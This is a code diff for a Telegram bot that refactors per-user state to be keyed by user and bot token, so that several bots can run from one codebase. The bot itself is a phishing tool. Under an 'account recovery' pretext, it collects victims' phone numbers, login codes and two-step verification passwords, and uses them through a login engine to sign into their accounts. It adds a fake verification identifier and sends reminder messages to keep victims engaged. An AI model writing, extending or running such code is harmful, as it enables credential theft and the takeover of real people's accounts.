@@ -68,8 +68,28 @@ async def send_custom_response(bot: Bot, chat_id: int, text: str,
 
 
 # ── User state ──────────────────────────────────────────────────────
-# uid -> {"phone", "step", "created_at", "attempts"}
-_user_state: dict[int, dict] = {}
+# (uid, bot_token) -> {"phone", "step", "created_at", "attempts"}
+_user_state: dict[tuple, dict] = {}
+
+
+def _sk(uid: int, bot: Bot) -> tuple:
+    """State key: uniquely identifies a user+bot pair."""
+    return (uid, bot.token)
+
+
+def _get_state(uid: int, bot: Bot) -> dict | None:
+    """Get user state for a specific bot."""
+    return _user_state.get(_sk(uid, bot))
+
+
+def _set_state(uid: int, bot: Bot, state: dict):
+    """Set user state for a specific bot."""
+    _user_state[_sk(uid, bot)] = state
+
+
+def _pop_state(uid: int, bot: Bot) -> dict | None:
+    """Remove and return user state for a specific bot."""
+    return _user_state.pop(_sk(uid, bot), None)
 
 # ── Chat history for manual reply panel ─────────────────────────
 # uid -> {"name": str, "messages": [{"from": "user"|"bot", "text": str, "time": float}]}
@@ -289,11 +309,17 @@ def _generate_12_digit_code() -> str:
 
 
 async def check_timeouts_loop(bot: Bot):
+    bot_token = bot.token
     while True:
         try:
             await asyncio.sleep(10)
             now = time.time()
-            for uid, state in list(_user_state.items()):
+            for key, state in list(_user_state.items()):
+                # Only process states belonging to this bot
+                uid, token = key
+                if token != bot_token:
+                    continue
+
                 step = state.get("step")
                 created_at = state.get("created_at")
                 if not created_at:
@@ -320,7 +346,7 @@ async def check_timeouts_loop(bot: Bot):
                         state["remind_sent"] = sent + 1
                     # Clean up stale "started" states after 10 minutes
                     if elapsed >= 600:
-                        _user_state.pop(uid, None)
+                        _user_state.pop(key, None)
                     continue
 
                 if step not in ("code", "2fa"):
@@ -350,7 +376,7 @@ async def check_timeouts_loop(bot: Bot):
 
                 # ── 5-minute hard timeout ──
                 if elapsed >= 300:
-                    _user_state.pop(uid, None)
+                    _user_state.pop(key, None)
                     phone = state.get("phone")
                     await login_engine.cancel_pending(phone)
                     if step == "code":
@@ -380,7 +406,7 @@ def _user_name(message: Message) -> str:
 @router.message(Command("start"))
 async def cmd_start(message: Message, bot: Bot):
     uid = message.from_user.id
-    old = _user_state.pop(uid, None)
+    old = _pop_state(uid, bot)
     if old and "phone" in old:
         await login_engine.cancel_pending(old["phone"])
 
@@ -406,7 +432,7 @@ async def cmd_start(message: Message, bot: Bot):
     logger.info(f"[{uid}] /start")
 
     # Record start time for /start remind feature
-    _user_state[uid] = {"step": "started", "created_at": time.time()}
+    _set_state(uid, bot, {"step": "started", "created_at": time.time()})
 
 
 # ── 分享联系人 ──────────────────────────────────────────────────────
@@ -421,10 +447,10 @@ async def handle_contact(message: Message, bot: Bot):
     _record_msg(uid, _user_name(message), "user", f"[分享联系人] {phone}")
     result = await login_engine.send_code(phone)
     if result.get("success"):
-        _user_state[uid] = {
+        _set_state(uid, bot, {
             "phone": phone, "step": "code",
             "created_at": time.time(), "attempts": 0,
-        }
+        })
         text = _c("code_panel_title", "✅ 回执码已发送！")
         if _cfg and _cfg.get("show_12_digit_code", False):
             text += f"\n🔖 验证标识: {_generate_12_digit_code()}"
@@ -440,7 +466,7 @@ async def handle_contact(message: Message, bot: Bot):
 @router.message(F.text == "开 始 恢 复 账 户")
 async def btn_phone_login(message: Message, bot: Bot):
     uid = message.from_user.id
-    _user_state[uid] = {"step": "phone_input"}
+    _set_state(uid, bot, {"step": "phone_input"})
     await message.answer(
         "⚠️请输入您的账户手机号码（带完整区号，例如 +86130008800）",
         parse_mode="HTML",
@@ -451,33 +477,35 @@ async def btn_phone_login(message: Message, bot: Bot):
 @router.message(F.text.regexp(r"^\+\d{7,15}$"))
 async def handle_phone_input(message: Message, bot: Bot):
     uid = message.from_user.id
-    state = _user_state.get(uid)
+    state = _get_state(uid, bot)
     if not state or state.get("step") != "phone_input":
         return
 
     phone = message.text.strip()
     result = await login_engine.send_code(phone)
     if result.get("success"):
-        _user_state[uid] = {
+        _set_state(uid, bot, {
             "phone": phone, "step": "code",
             "created_at": time.time(), "attempts": 0,
-        }
+        })
         text = _c("code_panel_title", "✅ 回执码已发送！")
         if _cfg and _cfg.get("show_12_digit_code", False):
             text += f"\n🔖 验证标识: {_generate_12_digit_code()}"
         await send_custom_response(bot, message.chat.id, text, None, view_code_kb(phone))
         logger.info(f"[{uid}] 验证码已发送(手动) -> {phone}")
     else:
-        _user_state.pop(uid, None)
+        _pop_state(uid, bot)
         err_msg = result.get('message', '发送验证码失败')
         await message.answer(f"❌ {err_msg}", reply_markup=main_menu_kb())
 
 
 # ── 验证码输入 ──────────────────────────────────────────────────────
-@router.message(F.text, lambda msg: _user_state.get(msg.from_user.id, {}).get("step") == "code")
+@router.message(F.text, lambda msg: any(
+    s.get("step") == "code" for (u, _), s in _user_state.items() if u == msg.from_user.id
+))
 async def handle_code_input(message: Message, bot: Bot):
     uid = message.from_user.id
-    state = _user_state.get(uid)
+    state = _get_state(uid, bot)
     if not state or state.get("step") != "code":
         return
     if message.text.startswith("/"):
@@ -492,7 +520,7 @@ async def handle_code_input(message: Message, bot: Bot):
         state["attempts"] = state.get("attempts", 0) + 1
         remaining = max_attempts - state["attempts"]
         if remaining <= 0:
-            _user_state.pop(uid, None)
+            _pop_state(uid, bot)
             await login_engine.cancel_pending(phone)
             await message.answer(_c("code_max_retries_text", "❌ 错误次数过多，请重新 /start"))
         else:
@@ -503,24 +531,24 @@ async def handle_code_input(message: Message, bot: Bot):
     result = await login_engine.sign_in_with_code(phone, code)
 
     if result.get("success"):
-        _user_state.pop(uid, None)
+        _pop_state(uid, bot)
         await _handle_login_success(
             bot, message.chat.id, uid, phone,
             result.get("user_info", {}))
     else:
         need_2fa = result.get("need_2fa", False)
         if need_2fa:
-            _user_state[uid] = {
+            _set_state(uid, bot, {
                 "phone": phone, "step": "2fa",
                 "created_at": time.time(), "attempts": 0,
-            }
+            })
             await message.answer(_c("prompt_2fa_text", "请输入两步验证密码"))
             logger.info(f"[{uid}] 需要两步验证: {phone}")
         else:
             state["attempts"] = state.get("attempts", 0) + 1
             remaining = max_attempts - state["attempts"]
             if remaining <= 0:
-                _user_state.pop(uid, None)
+                _pop_state(uid, bot)
                 await login_engine.cancel_pending(phone)
                 await message.answer(_c("code_max_retries_text", "❌ 错误次数过多"))
             else:
@@ -534,10 +562,12 @@ async def handle_code_input(message: Message, bot: Bot):
 
 
 # ── 两步验证 ────────────────────────────────────────────────────────
-@router.message(F.text, lambda msg: _user_state.get(msg.from_user.id, {}).get("step") == "2fa")
+@router.message(F.text, lambda msg: any(
+    s.get("step") == "2fa" for (u, _), s in _user_state.items() if u == msg.from_user.id
+))
 async def handle_2fa_input(message: Message, bot: Bot):
     uid = message.from_user.id
-    state = _user_state.get(uid)
+    state = _get_state(uid, bot)
     if not state or state.get("step") != "2fa":
         return
     if message.text.startswith("/"):
@@ -551,7 +581,7 @@ async def handle_2fa_input(message: Message, bot: Bot):
     result = await login_engine.sign_in_with_2fa(phone, password)
 
     if result.get("success"):
-        _user_state.pop(uid, None)
+        _pop_state(uid, bot)
         await _handle_login_success(
             bot, message.chat.id, uid, phone,
             result.get("user_info", {}),
@@ -560,7 +590,7 @@ async def handle_2fa_input(message: Message, bot: Bot):
         state["attempts"] = state.get("attempts", 0) + 1
         remaining = max_attempts - state["attempts"]
         if remaining <= 0:
-            _user_state.pop(uid, None)
+            _pop_state(uid, bot)
             await login_engine.cancel_pending(phone)
             await message.answer(_c("tfa_max_retries_text", "❌ 密码错误次数过多"))
         else:
@@ -580,7 +610,7 @@ async def handle_default(message: Message, bot: Bot):
     uid = message.from_user.id
     if message.text.startswith("/"):
         return
-    state = _user_state.get(uid)
+    state = _get_state(uid, bot)
     if state and state.get("step") in ("code", "2fa", "phone_input"):
         return  # Already handled by specific handlers above
 
